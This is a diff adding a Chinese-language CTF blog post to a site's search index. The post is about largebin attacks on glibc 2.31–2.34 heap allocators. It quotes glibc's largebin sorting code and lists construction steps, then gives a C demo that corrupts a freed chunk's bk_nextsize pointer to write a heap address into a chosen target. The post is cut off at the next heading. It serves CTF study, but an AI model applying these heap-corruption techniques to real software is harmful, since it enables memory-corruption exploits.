@@ -813,4 +813,62 @@
         <tag>glibc2.33</tag>
       </tags>
   </entry>
+  <entry>
+    <title>exploitation-in-latest-glibc-0x00</title>
+    <url>/2022/07/12/exploitation-in-latest-glibc-0x00/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>现在很多赛题都围绕着<code>glibc2.31~2.34</code>下的利用来考，故在此总结一下:  </p>
+<ul>
+<li><a href="#largebin-attack">largebin-attack</a></li>
+<li>House_of_pig</li>
+<li>tcache_attack<ul>
+<li>modify TLS</li>
+<li>modify mp_</li>
+<li><a href="#tcache_stashing_unlink_attack">tcache stashing unlink attack</a></li>
+</ul>
+</li>
+<li>House_of_Emma    </li>
+<li>House_of_kiwi</li>
+<li>House_of_banana</li>
+</ul>
+<hr>
+<h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin-attack"></a>largebin-attack</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><code>largebin-attack</code>在新版本( <code>&gt;= glibc2.31</code> )下的利用思路比较固定，利用点在于触发<code>malloc_consolidate</code>将<code>size &gt; 0x408</code>且不与<code>top_chunk</code>相邻的块整理到<code>largebin</code>中时缺少相应的安全性检查:  </p>
+<p><a href="https://ftp.gnu.org/gnu/glibc/glibc-2.3.3.tar.gz">glibc2.33</a>&#x2F;malloc&#x2F;malloc.c-line:3891:  </p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	victim_index = <span class="built_in">largebin_index</span> (size);</span><br><span class="line">	bck = <span class="built_in">bin_at</span> (av, victim_index);</span><br><span class="line">	fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">	<span class="keyword">if</span> (fwd != bck)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">		size |= PREV_INUSE;</span><br><span class="line">		<span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">		<span class="built_in">assert</span> (<span class="built_in">chunk_main_arena</span> (bck-&gt;bk));</span><br><span class="line">		<span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) <span class="built_in">chunksize_nomask</span> (bck-&gt;bk))</span><br><span class="line">		&#123;</span><br><span class="line">			fwd = bck;</span><br><span class="line">			bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">			victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">			victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">			fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">assert</span> (<span class="built_in">chunk_main_arena</span> (fwd));</span><br><span class="line">			<span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; <span class="built_in">chunksize_nomask</span> (fwd))</span><br><span class="line">			&#123;</span><br><span class="line">				fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">				<span class="built_in">assert</span> (<span class="built_in">chunk_main_arena</span> (fwd));</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) <span class="built_in">chunksize_nomask</span> (fwd))</span><br><span class="line">				<span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">				fwd = fwd-&gt;fd;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				victim-&gt;fd_nextsize = fwd;</span><br><span class="line">				victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">				<span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">					<span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">				fwd-&gt;bk_nextsize = victim;</span><br><span class="line">				victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">			&#125;</span><br><span class="line">			bck = fwd-&gt;bk;</span><br><span class="line">			<span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">				<span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>与利用相关的关键逻辑在于:  当一个比<code>largebin</code>当前链表中堆块小的块进入时，会触发排序，造成:  </p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
+
+<p>即将这个<code>chunk</code>的地址写入<code>bk_nextsize+0x20</code>处，因此利用时的构造思路也比较固定:  </p>
+<ul>
+<li>申请一个大的<code>chunk0</code>与一个略小的<code>chunk1</code>，保证二者的大小满足处于同一条<code>largebin</code>链上</li>
+<li>释放<code>chunk0</code>进入<code>unsortedbin</code>，然后申请一个更大的<code>chunk2</code>触发<code>malloc_consolidate</code>把<code>chunk0</code>放进<code>largebin</code>中</li>
+<li>释放<code>chunk1</code>进入<code>unsortedbin</code>，同时借助漏洞修改<code>chunk0-&gt;bk_nextsize = &amp;target-0x20</code></li>
+<li>申请一个大堆块触发<code>malloc_consolidate</code>把<code>chunk1</code>也放进<code>largebin</code>中</li>
+<li><strong>构造时要记得隔开几个堆块避免合并</strong></li>
+</ul>
+<hr>
+<h4 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">	<span class="type">size_t</span> *chunk0 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">	<span class="type">size_t</span> *unused = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">	<span class="type">size_t</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">	<span class="type">size_t</span> *unuseD = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk0);</span><br><span class="line">	<span class="type">size_t</span> *unusED = <span class="built_in">malloc</span>(<span class="number">0x520</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1);</span><br><span class="line">	<span class="comment">// chunk0[3] = (size_t)((&amp;target)-4);</span></span><br><span class="line">	*(<span class="type">size_t</span> *)((<span class="type">char</span> *)chunk0 + <span class="number">0x18</span>) = (<span class="type">size_t</span>)((<span class="type">char</span>*)(&amp;target)<span class="number">-0x20</span>);</span><br><span class="line">	<span class="type">size_t</span> *unuSED = <span class="built_in">malloc</span>(<span class="number">0x520</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, target);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>根据上面的构造模板，不需要知道原理也能直接使用<code>largebin_attack</code>将任意地址的值改为堆上的一个地址，这时候就可以联想到:  </p>
+<ul>
+<li>global_max_fast</li>
+<li>mp_.tcache_bins<ul>
+<li><a href="https://github.com/AvavaAYA/ctf-writeup-collection/tree/main/PCB-2022/A_fruit">鹏城杯-online-2022-A_fruit</a></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h2>]]></content>
+      <categories>
+        <category>pwn-writeup</category>
+      </categories>
+      <tags>
+        <tag>glibc2.34</tag>
+        <tag>largebin-attack</tag>
+        <tag>house-of-pig</tag>
+      </tags>
+  </entry>
 </search>
